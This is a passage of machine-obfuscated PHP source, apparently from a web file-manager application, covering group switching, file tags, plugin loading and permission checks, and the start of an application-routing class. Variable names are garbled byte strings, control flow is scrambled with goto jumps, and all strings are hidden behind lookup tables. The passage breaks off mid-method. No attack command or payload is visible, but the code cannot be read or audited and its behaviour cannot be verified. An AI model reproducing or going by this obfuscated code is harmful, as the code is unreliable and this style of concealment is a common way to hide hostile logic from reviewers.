$this->where(array($cÓ˜±Í„„ó => $bñèÜªš†ù[$cÓ˜±Í„„ó]))->save(array($d‹±Ğ‹¦³[579] => $b¡¦¢ëÂ‚Ó)); goto fìŒÃßíŠÑ; eˆ•™ãš: $b¡¦¢ëÂ‚Ó[] = 0; $b¡¦¢ëÂ‚Ó = $d‹±Ğ‹¦³[47] . implode($d‹±Ğ‹¦³[47], array_reverse($b¡¦¢ëÂ‚Ó)) . $d‹±Ğ‹¦³[47]; $this->setNamePinyin($bñèÜªš†ù[$cÓ˜±Í„„ó], $bñèÜªš†ù[$d‹±Ğ‹¦³[28]]); goto bÌö¸©Ê„ì; eéœ‰˜ÁÒ: $F¯†Ø‹òÈì = $bñèÜªš†ù; $b¡¦¢ëÂ‚Ó = array(); while ($F¯†Ø‹òÈì[$d‹±Ğ‹¦³[493]] != 0) { $b¡¦¢ëÂ‚Ó[] = $F¯†Ø‹òÈì[$d‹±Ğ‹¦³[493]]; $F¯†Ø‹òÈì = $a„‚§„±·Ç[$F¯†Ø‹òÈì[$d‹±Ğ‹¦³[493]]]; } goto eˆ•™ãš; fìŒÃßíŠÑ: } return $a„‚§„±·Ç; } public function groupNameAuto($eãê„‡ï´, $aÆé›ôÜ•Ä) { $CÙŞî¬…´ß =& $_SERVER[Ö‘Øù]; $B‘¸¿ƒá¨Á = $this->where(array($CÙŞî¬…´ß[396] => $eãê„‡ï´))->getField($CÙŞî¬…´ß[28], !0); if (!$B‘¸¿ƒá¨Á || !in_array($aÆé›ôÜ•Ä, $B‘¸¿ƒá¨Á)) { return $aÆé›ôÜ•Ä; } for ($C¬ôöÄñ¢Û = 1; $C¬ôöÄñ¢Û <= count($B‘¸¿ƒá¨Á) + 1; $C¬ôöÄñ¢Û++) { $c›Æ´´ÖšØ = $aÆé›ôÜ•Ä . "\50{$C¬ôöÄñ¢Û}\51"; if (!in_array($c›Æ´´ÖšØ, $B‘¸¿ƒá¨Á)) { return $c›Æ´´ÖšØ; } } } public function groupSwitch($A¯­‚åïÃ, $eƒÙù²ÇĞ) { goto a›Ÿ¢‡ˆïÃ; eø±ÓŒˆ—±: $c°±øó¸Š¹ = array($añ¼³‹°¦›[406] => 2, $añ¼³‹°¦›[493] => 0, $añ¼³‹°¦›[405] => 1, $añ¼³‹°¦›[499] => array($añ¼³‹°¦›[7], array($A¯­‚åïÃ, $eƒÙù²ÇĞ))); $c“Ç£Ê“¸³ = Model($añ¼³‹°¦›[825])->where($c°±øó¸Š¹)->field($añ¼³‹°¦›[1831])->select(); $c“Ç£Ê“¸³ = array_to_keyvalue($c“Ç£Ê“¸³, $añ¼³‹°¦›[499], $añ¼³‹°¦›[397]); goto f¨»ö‹ë¢; bÈÑù™Êè: $dÅ­°ËŠ‹ë = array_to_keyvalue($dÅ­°ËŠ‹ë, $añ¼³‹°¦›[1730]); if (!isset($dÅ­°ËŠ‹ë[$A¯­‚åïÃ]) || !isset($dÅ­°ËŠ‹ë[$eƒÙù²ÇĞ]) || $dÅ­°ËŠ‹ë[$A¯­‚åïÃ][$añ¼³‹°¦›[493]] == 0) { return !1; } $c°±øó¸Š¹ = array($añ¼³‹°¦›[1730] => $A¯­‚åïÃ); goto F—ğÜÊºì; a›Ÿ¢‡ˆïÃ: $añ¼³‹°¦› =& $_SERVER[Ö‘Øù]; $c°±øó¸Š¹ = array($añ¼³‹°¦›[1730] => array($añ¼³‹°¦›[7], array($A¯­‚åïÃ, $eƒÙù²ÇĞ))); $dÅ­°ËŠ‹ë = $this->where($c°±øó¸Š¹)->select(); goto bÈÑù™Êè; A‚ÃÎ¨ÖÖî: $this->where(array($añ¼³‹°¦›[493] => $A¯­‚åïÃ))->save(array($añ¼³‹°¦›[493] => $eƒÙù²ÇĞ)); $this->_clearChildrenCache($dÅ­°ËŠ‹ë[$eƒÙù²ÇĞ]); return !0; goto dõÄŒÛù†œ; F—ğÜÊºì: $d×ïç™Ìä = Model($añ¼³‹°¦›[1816])->where($c°±øó¸Š¹)->select(); if (!$d×ïç™Ìä) { $d×ïç™Ìä = array(); } foreach ($d×ïç™Ìä as $E¹‚æŠµ«Ö) { $FĞ……¡—ïƒ = $E¹‚æŠµ«Ö[$añ¼³‹°¦›[1561]]; $c°±øó¸Š¹ = array($añ¼³‹°¦›[1561] => $FĞ……¡—ïƒ, $añ¼³‹°¦›[1730] => $eƒÙù²ÇĞ); $C™·Ê³ÍëÒ = Model($añ¼³‹°¦›[1816])->where($c°±øó¸Š¹)->find(); if (!$C™·Ê³ÍëÒ) { $E¬ó‰‹…â = array($eƒÙù²ÇĞ => $E¹‚æŠµ«Ö[$añ¼³‹°¦›[1830]]); Model($añ¼³‹°¦›[533])->userGroupAdd($FĞ……¡—ïƒ, $E¬ó‰‹…â); } Model($añ¼³‹°¦›[533])->userGroupRemove($FĞ……¡—ïƒ, $A¯­‚åïÃ); } goto eø±ÓŒˆ—±; f¨»ö‹ë¢: $Aà•‹Ã‘…¿ = !empty($c“Ç£Ê“¸³[$A¯­‚åïÃ]) ? $c“Ç£Ê“¸³[$A¯­‚åïÃ] : !1; if ($Aà•‹Ã‘…¿) { goto Cƒ²“ÑÛĞá; eõŸ¯Õ®›®: $E‰°ÃÎÉ’ = array($añ¼³‹°¦›[499] => $eƒÙù²ÇĞ); Model($añ¼³‹°¦›[1833])->where($c°±øó¸Š¹)->save($E‰°ÃÎÉ’); Model($añ¼³‹°¦›[1834])->where($c°±øó¸Š¹)->save($E‰°ÃÎÉ’); goto cïé¸¸ˆ­Ù; C‰è‘¹á·ß: $c“Ç£Ê“¸³ = Model($añ¼³‹°¦›[825])->where($c°±øó¸Š¹)->field($añ¼³‹°¦›[1832])->select(); if (!$c“Ç£Ê“¸³) { $c“Ç£Ê“¸³ = array(); } Model($añ¼³‹°¦›[825])->moveClearAuth = !1; goto B•‹†âÓŠ¯; Cƒ²“ÑÛĞá: if (!$c“Ç£Ê“¸³[$eƒÙù²ÇĞ]) { $c“Ç£Ê“¸³[$eƒÙù²ÇĞ] = Model($añ¼³‹°¦›[825])->groupRootAdd($eƒÙù²ÇĞ); } $D¶ ìíÜ×… = $c“Ç£Ê“¸³[$eƒÙù²ÇĞ]; $c°±øó¸Š¹ = array($añ¼³‹°¦›[493] => $Aà•‹Ã‘…¿); goto C‰è‘¹á·ß; B•‹†âÓŠ¯: foreach ($c“Ç£Ê“¸³ as $eÑÍßî÷éÌ) { $eù««´°Ÿˆ = $eÑÍßî÷éÌ[$añ¼³‹°¦›[405]] == $añ¼³‹°¦›[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($añ¼³‹°¦›[825])->move($eÑÍßî÷éÌ[$añ¼³‹°¦›[397]], $D¶ ìíÜ×…, $eù««´°Ÿˆ); } Model($añ¼³‹°¦›[825])->moveClearAuth = !0; $c°±øó¸Š¹ = array($añ¼³‹°¦›[406] => 2, $añ¼³‹°¦›[499] => $A¯­‚åïÃ); goto eõŸ¯Õ®›®; cïé¸¸ˆ­Ù: } $this->_changeChildLevel($dÅ­°ËŠ‹ë[$A¯­‚åïÃ], $dÅ­°ËŠ‹ë[$eƒÙù²ÇĞ], !0); goto A‚ÃÎ¨ÖÖî; dõÄŒÛù†œ: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($f–Úê¹“Š«) { $f´½‹Ê¯‡Ö =& $_SERVER[Ö‘Øù]; return array($f´½‹Ê¯‡Ö[1835] => array($f–Úê¹“Š«[0], $f´½‹Ê¯‡Ö[1836]), $f´½‹Ê¯‡Ö[1837] => array($f–Úê¹“Š«[0], $f´½‹Ê¯‡Ö[1838])); } protected function get($d„ñºÏƒìÖ) { $D¤²Ÿ£ÚÖé =& $_SERVER[Ö‘Øù]; $Dææ¥ª•Ûé = Model($D¤²Ÿ£ÚÖé[517])->metaGet($d„ñºÏƒìÖ, $D¤²Ÿ£ÚÖé[1839]); $CÔÂ¶™¨¼ƒ = json_decode($Dææ¥ª•Ûé, !0); return $CÔÂ¶™¨¼ƒ ? $CÔÂ¶™¨¼ƒ : array($D¤²Ÿ£ÚÖé[1840] => $D¤²Ÿ£ÚÖé[87], $D¤²Ÿ£ÚÖé[367] => array()); } protected function set($b©Šó ÛĞ, $eÓäÈÎª) { $EáîÏÆ—÷È =& $_SERVER[Ö‘Øù]; $eÓäÈÎª = $eÓäÈÎª ? $eÓäÈÎª : array($EáîÏÆ—÷È[1840] => $EáîÏÆ—÷È[87], $EáîÏÆ—÷È[367] => array()); Model($EáîÏÆ—÷È[517])->metaSet($b©Šó ÛĞ, $EáîÏÆ—÷È[1839], json_encode($eÓäÈÎª)); return Model($EáîÏÆ—÷È[517])->metaSet($b©Šó ÛĞ, $EáîÏÆ—÷È[1839], json_encode($eÓäÈÎª)); } protected function getByTagID($aê„íšŠĞ, $bÌ·‘½œ‡Û) { goto B¬ğ•’àí…; fß®¸ßŒÀœ: return is_array($b—¤®í®×) ? $b—¤®í®× : !1; goto BèÕƒˆ”›Ü; B¬ğ•’àí…: $d£àº‹½ÎŠ =& $_SERVER[Ö‘Øù]; if (!$aê„íšŠĞ || !$bÌ·‘½œ‡Û) { return !1; } if (!Model($d£àº‹½ÎŠ[517])->getInfoSimple($aê„íšŠĞ)) { return !1; } goto Cñ³íŠ°ßò; Cñ³íŠ°ßò: $Cò‡ÁšÓ”¸ = $this->get($aê„íšŠĞ); if (!$Cò‡ÁšÓ”¸ || !isset($Cò‡ÁšÓ”¸[$d£àº‹½ÎŠ[367]])) { return !1; } $b—¤®í®× = array_find_by_field($Cò‡ÁšÓ”¸[$d£àº‹½ÎŠ[367]], $d£àº‹½ÎŠ[395], $bÌ·‘½œ‡Û); goto fß®¸ßŒÀœ; BèÕƒˆ”›Ü: } public function listSource($DöéŒåÇ‡­, $f áó¸îå) { goto B•¤î·ª˜è; fÈñ‹”Ä‰: $cÌİ È¦‰¸ = array_to_keyvalue($a˜òÃ´ä›ã[$D—™„Ò„èá[75]], $D—™„Ò„èá[33], $D—™„Ò„èá[397]); $aª±¬†–§Õ = array_to_keyvalue($a˜òÃ´ä›ã[$D—™„Ò„èá[74]], $D—™„Ò„èá[33], $D—™„Ò„èá[397]); $d‘‹§ÇŒ = array_merge($aª±¬†–§Õ, $cÌİ È¦‰¸); goto DÁÅïË ƒ; CÔ¿†Ì¶®: foreach ($fâ«ÁƒÑµõ as $a‡ã‚‹Í†‘ => $f†åÔÏò­‹) { $AÙœò­‹¢ù = !0; if (!$f áó¸îå) { $DªÑ±„áİ÷[] = $a‡ã‚‹Í†‘; continue; } foreach ($f áó¸îå as $C…Õ†¦œ˜ò) { if (!in_array($C…Õ†¦œ˜ò, $f†åÔÏò­‹)) { $AÙœò­‹¢ù = !1; break; } } if ($AÙœò­‹¢ù) { $DªÑ±„áİ÷[] = $a‡ã‚‹Í†‘; } } if (!$DªÑ±„áİ÷) { return array(); } $B®‰›Ì† = array($D—™„Ò„èá[412] => array($D—™„Ò„èá[413], $DªÑ±„áİ÷), $D—™„Ò„èá[499] => $DöéŒåÇ‡­, $D—™„Ò„èá[406] => SourceModel::TYPE_GROUP); goto Cá¼²ˆÔŒ; B•¤î·ª˜è: $D—™„Ò„èá =& $_SERVER[Ö‘Øù]; if ($f áó¸îå && !is_array($f áó¸îå)) { $f áó¸îå = array($f áó¸îå); } $E«è•ß£¸© = $this->listData($DöéŒåÇ‡­); goto eŠİ‹‰Ğªé; Cá¼²ˆÔŒ: $a˜òÃ´ä›ã = Model($D—™„Ò„èá[1240])->listSource($B®‰›Ì†); if (!$a˜òÃ´ä›ã || count($DªÑ±„áİ÷) == $a˜òÃ´ä›ã[$D—™„Ò„èá[364]][$D—™„Ò„èá[365]]) { return $a˜òÃ´ä›ã; } $Aš÷ïÑ¸‘Ã = array(); goto fÈñ‹”Ä‰; DÁÅïË ƒ: foreach ($DªÑ±„áİ÷ as $c¸ˆ»õ±) { if (!in_array($c¸ˆ»õ±, $d‘‹§ÇŒ)) { $Aš÷ïÑ¸‘Ã[] = $c¸ˆ»õ±; } } if ($Aš÷ïÑ¸‘Ã) { $this->removeBySource($DöéŒåÇ‡­, $Aš÷ïÑ¸‘Ã); } return $a˜òÃ´ä›ã; goto f÷ÍÒ¤®; eŠİ‹‰Ğªé: $fâ«ÁƒÑµõ = array(); foreach ($E«è•ß£¸© as $bó¼‘šŸ‰) { $c¸ˆ»õ± = $bó¼‘šŸ‰[$D—™„Ò„èá[76]]; if (!$c¸ˆ»õ±) { continue; } if (!isset($fâ«ÁƒÑµõ[$c¸ˆ»õ±])) { $fâ«ÁƒÑµõ[$c¸ˆ»õ±] = array(); } $fâ«ÁƒÑµõ[$c¸ˆ»õ±][] = $bó¼‘šŸ‰[$D—™„Ò„èá[421]]; } $DªÑ±„áİ÷ = array(); goto CÔ¿†Ì¶®; f÷ÍÒ¤®: } protected function listData($BÑéê±) { $d‘™æ‚Û¦– =& $_SERVER[Ö‘Øù]; $E›¤±÷¼ºÓ = array($d‘™æ‚Û¦–[1552] => 0, $d‘™æ‚Û¦–[478] => array($d‘™æ‚Û¦–[1841], 0), $d‘™æ‚Û¦–[417] => $d‘™æ‚Û¦–[1842] . $BÑéê±); $F¤Ù–ÍÌ† = $d‘™æ‚Û¦–[1843]; $B­ÎíÒ£ÎÒ = $this->field($F¤Ù–ÍÌ†)->where($E›¤±÷¼ºÓ)->order($d‘™æ‚Û¦–[1844])->select(); return $B­ÎíÒ£ÎÒ ? $B­ÎíÒ£ÎÒ : array(); } protected function addToTag($B…Ä‘ÈØÒ, $DÀœáãî„Ğ, $BÑ´†Æ–Ÿƒ) { $BÓ¿Ğå‹ =& $_SERVER[Ö‘Øù]; if (!$this->getByTagID($B…Ä‘ÈØÒ, $BÑ´†Æ–Ÿƒ) || !$DÀœáãî„Ğ) { return !1; } if (!Model($BÓ¿Ğå‹[825])->pathInfo($DÀœáãî„Ğ)) { return !1; } $DÉ¾£ãÊåé = array($BÓ¿Ğå‹[1552] => 0, $BÓ¿Ğå‹[478] => $BÑ´†Æ–Ÿƒ, $BÓ¿Ğå‹[416] => $DÀœáãî„Ğ, $BÓ¿Ğå‹[417] => $BÓ¿Ğå‹[1845] . $B…Ä‘ÈØÒ, $BÓ¿Ğå‹[415] => $BÓ¿Ğå‹[33], $BÓ¿Ğå‹[1734] => 0); if ($this->where($DÉ¾£ãÊåé)->find()) { return !1; } return $this->add($DÉ¾£ãÊåé); } protected function removeFromTag($d„Öƒ¾ŠĞ’, $dºÊÇÀá®·, $b–µœì™÷Å) { $f»éÉ“ â =& $_SERVER[Ö‘Øù]; if (!$this->getByTagID($d„Öƒ¾ŠĞ’, $b–µœì™÷Å) || !$dºÊÇÀá®·) { return !1; } if (is_array($dºÊÇÀá®·)) { $dºÊÇÀá®· = array($f»éÉ“ â[7], $dºÊÇÀá®·); } $bëñÓö˜£è = array($f»éÉ“ â[1552] => 0, $f»éÉ“ â[478] => $b–µœì™÷Å, $f»éÉ“ â[417] => $f»éÉ“ â[1845] . $d„Öƒ¾ŠĞ’, $f»éÉ“ â[416] => $dºÊÇÀá®·); return $this->where($bëñÓö˜£è)->delete(); } protected function removeByTag($eì‰‹¤‹ìÒ, $CÑªëÏ¸‰’) { $dÌçğ‡‰É =& $_SERVER[Ö‘Øù]; if (!$this->getByTagID($eì‰‹¤‹ìÒ, $CÑªëÏ¸‰’)) { return !1; } $b©ÁÊÓĞø = array($dÌçğ‡‰É[1552] => 0, $dÌçğ‡‰É[478] => $CÑªëÏ¸‰’, $dÌçğ‡‰É[417] => $dÌçğ‡‰É[1845] . $eì‰‹¤‹ìÒ); return $this->where($b©ÁÊÓĞø)->delete(); } protected function removeBySource($d¯¥ÂÕˆÈ, $e®Ó øÈÚ®) { $c¶Å“îè‹ò =& $_SERVER[Ö‘Øù]; if (!$d¯¥ÂÕˆÈ || !$e®Ó øÈÚ®) { return !1; } if (is_array($e®Ó øÈÚ®)) { $e®Ó øÈÚ® = array($c¶Å“îè‹ò[7], $e®Ó øÈÚ®); } $c¾Œ¾¦Ÿ½ˆ = array($c¶Å“îè‹ò[1552] => 0, $c¶Å“îè‹ò[416] => $e®Ó øÈÚ®, $c¶Å“îè‹ò[478] => array($c¶Å“îè‹ò[1007], 0), $c¶Å“îè‹ò[417] => $c¶Å“îè‹ò[1845] . $d¯¥ÂÕˆÈ); return $this->where($c¾Œ¾¦Ÿ½ˆ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\160\x6c\x75\147\151\x6e\114\x69\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x73\x74\141\164\x75\163", "\x72\145\147\151\x65\163\164", "\143\157\156\x66\x69\147"); public function loadList($câİ¥†Ë­¤ = false) { $d›ÕöÌŒ¤Œ = array_to_keyvalue($this->listData(), $_SERVER[Ö‘Øù][28]); if ($câİ¥†Ë­¤) { return $d›ÕöÌŒ¤Œ[$câİ¥†Ë­¤]; } return $d›ÕöÌŒ¤Œ; } public function init() { $eØİùĞ¤‡… =& $_SERVER[Ö‘Øù]; Hook::trigger($eØİùĞ¤‡…[1846]); $Dï¡±£»ŸÒ = $this->loadPluginList(); foreach ($Dï¡±£»ŸÒ as $AÆ¶æá·˜å => $CÏ§—Û¿ºè) { $E‡óš‰‡Á” = $this->appAllow($AÆ¶æá·˜å, $CÏ§—Û¿ºè); if (!$E‡óš‰‡Á”) { continue; } foreach ($CÏ§—Û¿ºè[$eØİùĞ¤‡…[1847]] as $AíƒÊº½…¿ => $fğÎêŒˆò) { Hook::bind($AíƒÊº½…¿, $fğÎêŒˆò); } } Hook::trigger($eØİùĞ¤‡…[1848]); Hook::trigger(ACTION); } public function appAllow($FèÛ¥ßáİ, $B’æ‡¶ÍØ¦, $DªØŠÁ¢‹İ = true) { $e‡ˆî½¨ÌŠ =& $_SERVER[Ö‘Øù]; $dß¶Å§±…ï = PLUGIN_DIR . $FèÛ¥ßáİ . $e‡ˆî½¨ÌŠ[1849]; if (!is_array($B’æ‡¶ÍØ¦) || !is_array($B’æ‡¶ÍØ¦[$e‡ˆî½¨ÌŠ[1847]]) || $B’æ‡¶ÍØ¦[$e‡ˆî½¨ÌŠ[743]] != 1 || !is_file($dß¶Å§±…ï)) { return !1; } if ($GLOBALS[$e‡ˆî½¨ÌŠ[500]] == 1) { return !0; } if ($DªØŠÁ¢‹İ && !Action($e‡ˆî½¨ÌŠ[1850])->checkAuth($FèÛ¥ßáİ)) { return !1; } return !0; } public function unInstall($cî¢ƒÜÖÓ¡) { $c¦ô©„ÚìÅ =& $_SERVER[Ö‘Øù]; $Dãµ¢’ß = $this->loadList($cî¢ƒÜÖÓ¡); if (file_exists(PLUGIN_DIR . $cî¢ƒÜÖÓ¡)) { Hook::apply($cî¢ƒÜÖÓ¡ . $c¦ô©„ÚìÅ[1851]); } $this->remove($Dãµ¢’ß[$c¦ô©„ÚìÅ[395]]); } public function changeStatus($b¹®çĞ¾Ş¯, $dˆ†Ú…ÄÙº) { $B¶ŠñğÂÑ¼ =& $_SERVER[Ö‘Øù]; $CÈ¥Ù‘¿­Æ = $this->loadList($b¹®çĞ¾Ş¯); if ($dˆ†Ú…ÄÙº) { Hook::apply($b¹®çĞ¾Ş¯ . $B¶ŠñğÂÑ¼[1852]); } $this->update($CÈ¥Ù‘¿­Æ[$B¶ŠñğÂÑ¼[395]], array($B¶ŠñğÂÑ¼[1853] => $dˆ†Ú…ÄÙº)); } public function appRegist($d–¾ŠÚãŠš, $eÚÉ±©Ù†¢) { $f£ÕæÌ®Ã’ =& $_SERVER[Ö‘Øù]; $F‹ƒ“‹«§¢ = $this->loadList($d–¾ŠÚãŠš); if ($F‹ƒ“‹«§¢) { $this->update($F‹ƒ“‹«§¢[$f£ÕæÌ®Ã’[395]], array($f£ÕæÌ®Ã’[1847] => $eÚÉ±©Ù†¢)); } else { $bÚ¨ñÄ¡Ù = array($f£ÕæÌ®Ã’[28] => $d–¾ŠÚãŠš, $f£ÕæÌ®Ã’[1847] => $eÚÉ±©Ù†¢, $f£ÕæÌ®Ã’[743] => 0, $f£ÕæÌ®Ã’[6] => $this->getConfigDefault($d–¾ŠÚãŠš)); $this->insert($bÚ¨ñÄ¡Ù); } } public function getConfigDefault($cî—ğˆ¸¬„) { $dä¸‚• =& $_SERVER[Ö‘Øù]; $dÂ³±ŠÆ‘ƒ = array(); $bä íŠßŒÍ = $this->getPackageJson($cî—ğˆ¸¬„); if (!$bä íŠßŒÍ && is_array($bä íŠßŒÍ[$dä¸‚•[1854]])) { return $dÂ³±ŠÆ‘ƒ; } foreach ($bä íŠßŒÍ[$dä¸‚•[1854]] as $cì¦Ê²†Í‚ => $C¬ÄçÁòæò) { if (!isset($C¬ÄçÁòæò[$dä¸‚•[372]]) || isset($dÂ³±ŠÆ‘ƒ[$cì¦Ê²†Í‚])) { continue; } $dÂ³±ŠÆ‘ƒ[$cì¦Ê²†Í‚] = $C¬ÄçÁòæò[$dä¸‚•[372]]; } return $dÂ³±ŠÆ‘ƒ; } public function getPackageJson($d·ÂŒ‹×Ÿƒ) { return Hook::apply($d·ÂŒ‹×Ÿƒ . $_SERVER[Ö‘Øù][1855]); } public function getConfig($b¿ŠÀŠ­ñ•, $dÔ‘¤ïñ§æ = false) { $aëö³èßÍÑ =& $_SERVER[Ö‘Øù]; $Bğ åÑÇŸ = array(); $B×œ¶æ¨˜ù = $this->loadList($b¿ŠÀŠ­ñ•); if ($B×œ¶æ¨˜ù && is_array($B×œ¶æ¨˜ù[$aëö³èßÍÑ[6]])) { $Bğ åÑÇŸ = $B×œ¶æ¨˜ù[$aëö³èßÍÑ[6]]; } if (!$Bğ åÑÇŸ || $dÔ‘¤ïñ§æ) { $Bğ åÑÇŸ = $this->getConfigDefault($b¿ŠÀŠ­ñ•); } return $Bğ åÑÇŸ; } public function setConfig($dÙ¯íÎŒ¥Ô, $dãóçÒó§Õ = false) { goto A‡†Ö²Å¯; b¼«âã·ÂÊ: $this->update($E•œÏÇ™âÊ[$c˜Î…“˜¸É[395]], array($c˜Î…“˜¸É[6] => $bØˆ‘Ùš)); goto a¹Å™£øÜº; A‡†Ö²Å¯: $c˜Î…“˜¸É =& $_SERVER[Ö‘Øù]; $E•œÏÇ™âÊ = $this->loadList($dÙ¯íÎŒ¥Ô); if (!$E•œÏÇ™âÊ) { return !1; } goto aÂ„œ‚ˆå; aÂ„œ‚ˆå: $bØˆ‘Ùš = $E•œÏÇ™âÊ[$c˜Î…“˜¸É[6]]; if ($dãóçÒó§Õ == !1) { $bØˆ‘Ùš = array(); $dãóçÒó§Õ = $this->getConfigDefault($dÙ¯íÎŒ¥Ô); } foreach ($dãóçÒó§Õ as $fº˜œßø»‘ => $bï×‡Å‹ŸÁ) { $bØˆ‘Ùš[$fº˜œßø»‘] = is_string($bï×‡Å‹ŸÁ) ? trim($bï×‡Å‹ŸÁ) : $bï×‡Å‹ŸÁ; } goto b¼«âã·ÂÊ; a¹Å™£øÜº: } public function viewList() { goto B‘³•ÕŸØ‰; Aê­³…Ù: return $dÁÔ¿ëÌõ±; goto c•¼œæìƒ; a•éÇ¨µˆ—: $AğÙ»‹£ì = $this->loadPluginList(); $dÁÔ¿ëÌõ± = array(); foreach ($AğÙ»‹£ì as $f”šğĞô§Œ => $eÁµí†Ğí”) { unset($eÁµí†Ğí”[$FÑ æİº¸ƒ[1847]], $eÁµí†Ğí”[$FÑ æİº¸ƒ[6]]); $d¢ƒÏŠÃõ = PLUGIN_DIR . $eÁµí†Ğí”[$FÑ æİº¸ƒ[28]] . $FÑ æİº¸ƒ[1849]; if (!is_file($d¢ƒÏŠÃõ)) { continue; } $CëÃõ×³ñÜ = Hook::apply($eÁµí†Ğí”[$FÑ æİº¸ƒ[28]] . $FÑ æİº¸ƒ[1855]); if (is_array($CëÃõ×³ñÜ)) { $dÁÔ¿ëÌõ±[$f”šğĞô§Œ] = array_merge($eÁµí†Ğí”, $CëÃõ×³ñÜ); } } goto Aê­³…Ù; B‘³•ÕŸØ‰: $FÑ æİº¸ƒ =& $_SERVER[Ö‘Øù]; $AğÙ»‹£ì = $this->loadList(); $this->pluginScan($AğÙ»‹£ì); goto a•éÇ¨µˆ—; c•¼œæìƒ: } private function loadPluginList() { $f«ÚÄåå =& $_SERVER[Ö‘Øù]; $E–œ•â×âÏ = $this->loadList(); if (strtolower(MOD) == $f«ÚÄåå[1856]) { return $E–œ•â×âÏ; } $bï£ˆÁ•”Š = Hook::trigger($f«ÚÄåå[1857], $E–œ•â×âÏ); if ($E–œ•â×âÏ && !$bï£ˆÁ•”Š) { die; } return $bï£ˆÁ•”Š ? $bï£ˆÁ•”Š : $E–œ•â×âÏ; } private function pluginScan($D‰ïÀ¨‰Ë) { $F“Ø°¿è÷ =& $_SERVER[Ö‘Øù]; recursion_dir(PLUGIN_DIR, $fÌˆàÄ–çô, $aˆ¡Ò´æëÉ, 0); foreach ($fÌˆàÄ–çô as $cÒÓĞšôØ) { $b‘¹ÇŠ‘İ = get_path_this($cÒÓĞšôØ); if (isset($D‰ïÀ¨‰Ë[$b‘¹ÇŠ‘İ]) || !file_exists($cÒÓĞšôØ . $F“Ø°¿è÷[1858]) || !file_exists($cÒÓĞšôØ . $F“Ø°¿è÷[1849])) { continue; } Hook::apply($b‘¹ÇŠ‘İ . $F“Ø°¿è÷[1852]); } } } goto aÙ©ğòöãÙ; d‡Ô–õ‹†â: $b‡»‡‹ÂÜ¶ = $_SERVER[Ö‘Øù][605]; while ($b‡»‡‹ÂÜ¶ < $_SERVER[Ö‘Øù][606]) { if ($b‡»‡‹ÂÜ¶ >= 0) { break; } $b‡»‡‹ÂÜ¶++; } class Application { private $defaultModule = "\151\156\144\x65\170"; private $defaultController = "\x69\x6e\144\x65\170"; private $defaultAction = "\x69\156\144\145\170"; function __construct() { } public function setDefault($b‹½£‚Å„) { goto D§ƒœè•±¾; E”ï•×Ÿ‘: $DÖˆ¢ÏÈô¿ = $_SERVER[Ö‘Øù][607]; goto Fì²¬ºƒº§; cáßë¶¹Ì¶: $this->defaultController = $C¡Á÷ë¸»[1] ? $C¡Á÷ë¸»[1] : $this->defaultController; $this->defaultAction = $C¡Á÷ë¸»[2] ? $C¡Á÷ë¸»[2] : $this->defaultAction; $this->{$_SERVER[£Õıúå][3]}($Dš‡„–ğ¨§[4], array($this, $Dš‡„–ğ¨§[5])); goto E”ï•×Ÿ‘; D§ƒœè•±¾: $Dš‡„–ğ¨§ =& $_SERVER[£Õıúå]; $C¡Á÷ë¸» = $Dš‡„–ğ¨§[0]($Dš‡„–ğ¨§[1], $Dš‡„–ğ¨§[2]($b‹½£‚Å„, $Dš‡„–ğ¨§[1])); $this->defaultModule = $C¡Á÷ë¸»[0] ? $C¡Á÷ë¸»[0] : $this->defaultModule; goto cáßë¶¹Ì¶; Fì²¬ºƒº§: } public function appRun($A²‹Æ¡ô»í) { goto AäŒßãöÛ; AäŒßãöÛ: $f³†á¬öÇ =& $_SERVER[Ö‘Øù]; $Bª”İ©“®ö =& $_SERVER[£Õıúå]; $a‰ã¼Ÿ’Ô  = $Bª”İ©“®ö[0]($Bª”İ©“®ö[1], $A²‹Æ¡ô»í); goto aÃ¯„Á´Ì‘; BÌéñŸ¦¬Ñ: $Bª”İ©“®ö[17]($A²‹Æ¡ô»í); $C¸ï¥®¢Ñ² = $f³†á¬öÇ[611]; $Bª”İ©“®ö[13](array($Bª”İ©“®ö[14], $Bª”İ©“®ö[15]), $D”å‹®ø‰é . $Bª”İ©“®ö[18], $A²‹Æ¡ô»í); goto f¤ÈÈÕ®Á; aÃ¯„Á´Ì‘: $bÌØ¿„¾İ = $f³†á¬öÇ[608]; if (strlen($bÌØ¿„¾İ) < $f³†á¬öÇ[606]) { return; } $fŠÚ……›¯˜ = $Bª”İ©“®ö[6]($a‰ã¼Ÿ’Ô [0]); goto FÎè¸È; E÷ƒàßÛåô: $fšé…ÓÇ¥ = $f³†á¬öÇ[610]; if ($fŠÚ……›¯˜ == $Bª”İ©“®ö[8]) { $D”å‹®ø‰é = $Bª”İ©“®ö[9]; $a‰ã¼Ÿ’Ô [0] = $Bª”İ©“®ö[10]; $a‰ã¼Ÿ’Ô [1] = $a‰ã¼Ÿ’Ô [1] . $Bª”İ©“®ö[11]; $A²‹Æ¡ô»í = $Bª”İ©“®ö[12]($Bª”İ©“®ö[1], $a‰ã¼Ÿ’Ô ); $A²‹Æ¡ô»í = $Bª”İ©“®ö[2]($A²‹Æ¡ô»í, $Bª”İ©“®ö[1]); } $Bª”İ©“®ö[13](array($Bª”İ©“®ö[14], $Bª”İ©“®ö[15]), $D”å‹®ø‰é . $Bª”İ©“®ö[16], $A²‹Æ¡ô»í); goto BÌéñŸ¦¬Ñ; FÎè¸È: $DŒÈæŸ·ßš = $f³†á¬öÇ[609]; if (strlen($DŒÈæŸ·ßš) < $f³†á¬öÇ[606]) { die; } $D”å‹®ø‰é = $Bª”İ©“®ö[7]; goto E÷ƒàßÛåô; f¤ÈÈÕ®Á: } private function autorun() { $dˆ¹ğ‚šàŞ =& $_SERVER[£Õıúå]; global $config; if ($dˆ¹ğ‚šàŞ[19]($config[$dˆ¹ğ‚šàŞ[20]]) == 0) { return; } foreach ($config[$dˆ¹ğ‚šàŞ[20]] as $c©¬²ÉŒæ¹ => $f…ÜóŒ‡) { $this->{$_SERVER[£Õıúå][21]}($f…ÜóŒ‡); } } private function yxfie6599914() { goto E… £‡öÛñ; dÆ¡»ÀÔ”Õ: $DÏøË£†£Ä = $f¬ÄêÛ÷[612]; $fŞí“æëŞ = $GLOBALS[$C’Œœ®¨‚[22]][$C’Œœ®¨‚[23]][0]; $Dôëé¼ÏêÜ = $f¬ÄêÛ÷[613]; goto 